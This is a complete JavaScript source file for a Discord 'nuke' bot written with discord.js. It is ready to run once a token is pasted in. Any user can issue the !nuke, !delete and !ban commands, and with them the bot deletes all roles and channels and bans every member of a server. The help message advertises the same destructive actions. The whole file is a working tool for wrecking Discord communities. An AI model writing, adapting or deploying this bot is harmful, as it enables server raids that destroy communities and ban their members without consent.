const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by sigron666.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `bye` }, type: 0 }); //status is changeable//
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Nuke Bot"));
}
if(msg.content.toLowerCase().startsWith("!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("!" + "ban")){
    msg.guild.members.tap(member => member.ban("Bot"));
}
if(msg.content.toLowerCase().startsWith("!" + "help")){
    msg.channel.send({
        embed: {
            color: 0xff0000, //color is changeable//
            author: { name: "Nuke" },
            description: "!nuke - Bans all members & deletes all roles and channels\n!delete - Deletes all channels and roles\n!ban - Bans all members in the discord\n\nFor any help contact"
        }
    })
}
});

nuke.login("PUT YOUR TOKEN HERE");
